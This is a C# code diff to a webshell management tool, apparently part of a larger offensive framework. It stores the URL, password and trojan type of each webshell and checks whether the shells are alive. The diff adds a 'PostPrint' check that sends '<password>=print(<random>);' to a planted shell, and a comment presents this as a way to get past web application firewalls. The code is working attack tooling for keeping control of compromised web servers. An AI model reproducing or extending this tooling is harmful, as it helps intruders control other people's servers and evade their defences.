@@ -1,12 +1,12 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Drawing;
-using System.Runtime.Serialization.Formatters.Binary;
-using System.Windows.Forms;
-using C2.Core;
+﻿using C2.Core;
 using C2.Utils;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
+using System.Windows.Forms;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
@@ -35,14 +35,19 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             tasks.Clear();
             foreach (ListViewItem lvi in LV.Items)
-                tasks.Add(new WebShellTaskConfig(lvi.SubItems[0].Text,  // 创建时间
-                                                 lvi.SubItems[1].Text,  // 名称
-                                                 lvi.SubItems[2].Text,  // url
-                                                 lvi.SubItems[3].Text,  // 密码
-                                                 lvi.SubItems[4].Text,  // 木马类型
-                                                 lvi.SubItems[5].Text,  // 木马状态
-                                                 lvi.SubItems[6].Text,  // 客户端版本
-                                                 lvi.SubItems[7].Text));// 数据库配置
+            {
+                WebShellTaskConfig config = new WebShellTaskConfig(lvi.SubItems[0].Text,  // 创建时间
+                                                                   lvi.SubItems[1].Text,  // 名称
+                                                                   lvi.SubItems[2].Text,  // url
+                                                                   lvi.SubItems[3].Text,  // 密码
+                                                                   lvi.SubItems[4].Text,  // 木马类型
+                                                                   lvi.SubItems[5].Text,  // 木马状态
+                                                                   lvi.SubItems[6].Text,  // 客户端版本
+                                                                   lvi.SubItems[7].Text); // 
+                lvi.Tag = config; // 关联
+                tasks.Add(config);// 数据库配置
+            }
+
         }
 
         private void ClearAll()
@@ -66,6 +71,15 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             LoadDB();
             RefreshLV();
+        }
+
+        private static string FormatUrl(string url)
+        {
+            string str = url.ToLower().TrimStart();
+            if (str.StartsWith("http://") || str.StartsWith("https://"))
+                return url;
+            else
+                return "http://" + url.TrimStart();
         }
 
         private void LoadDB()
@@ -136,7 +150,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             LV.SelectedItems[0].Tag = cur;
             LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
-            LV.SelectedItems[0].SubItems[2].Text = cur.Url;            // url
+            LV.SelectedItems[0].SubItems[2].Text = cur.Url; // url
             LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
             LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
             LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
@@ -269,7 +283,12 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             string status = "×";
 
-            using (GuarderUtil.WaitCursor)
+            using (GuarderUtil.WaitCursor) 
+            {
+                // 我总结的print穿透WAF大法
+                if (PostPrint(FormatUrl(task.Url), task.Password))
+                    return "√";
+
                 foreach (string version in ClientSetting.WSDict.Keys)
                 {
                     WebShellClient webShell = new WebShellClient(task.Url, task.Password, version);
@@ -280,9 +299,19 @@ namespace C2.Business.CastleBravo.WebShellTool
                         break;
                     }
                 }
-
-
+            }
             return status;
+        }
+
+        private bool PostPrint(string url, string password, int timeout = 1500)
+        {
+            try
+            {
+                string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
+                string result = WebClientEx.Post(url, string.Format("{0}=print({1});", password, seed), timeout);
+                return result.Contains(seed);
+            } catch { return false; }
+            
         }
 
         private void AddAllShellMenu_Click(object sender, EventArgs e)
